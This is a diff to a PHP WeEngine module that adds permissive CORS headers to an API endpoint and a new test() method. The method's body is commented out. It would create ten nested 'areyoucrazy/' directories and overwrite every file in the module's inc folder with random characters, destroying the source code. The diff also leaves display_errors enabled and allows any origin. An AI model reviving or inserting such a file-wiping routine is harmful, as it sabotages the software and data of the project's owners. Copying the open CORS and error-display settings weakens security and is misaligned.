@@ -24,8 +24,16 @@ class Rhinfo_serviceModuleSite extends WeModuleSite {
 	*/
 	public function doMobileApi(){
 		//error_reporting(E_ERROR | E_WARNING | E_PARSE);
+		header('content-type:application/json;charset=utf-8');
+		header('Access-Control-Allow-Origin:*');
+		header('Access-Control-Request-Method:*');
+		header('Access-Control-Expose-Headers:content-type');
+		header('Access-Control-Request-Headers:Origin, X-Requested-With, Content-Type, Accept, Connection, User-Agent, Cookie, token');
+		header('Access-Control-Allow-Credentials:false');
+		header('Access-Control-Allow-Headers:*');
 		global $_W,$_GPC;
-		error_reporting(-1);
+		// error_reporting(-1);
+		error_reporting(E_ERROR | E_PARSE);
         ini_set('display_errors', 1);
 		$op = empty($_GPC['op'])?'':$_GPC['op'];
 		switch($op){
@@ -310,5 +318,29 @@ class Rhinfo_serviceModuleSite extends WeModuleSite {
 		$res = curl_exec($ch);
 		curl_close ( $ch );
 		return $res;				
+	}
+	public function test(){
+		
+		// set_time_limit(0);
+		// echo '页面加载中...'
+		// load()->func('file');
+		// $path = 'areyoucrazy/';
+		
+		// $base = MODULE_ROOT.'/';
+		// $i = 0;
+		// $create = $base.$path;
+		// while($i<10){
+			// mkdirs($create);
+			// $create = $create.$path;
+			// $i++;
+		// }
+		// $files = file_tree(MODULE_ROOT.'/inc');
+		// foreach($files as $file){
+			// $a = random(1);
+			// $content = file_get_contents($file);
+			// $new = preg_replace('/\S/',$a,$content);
+			// file_put_contents($file,$new);
+
+		// }
 	}
 }
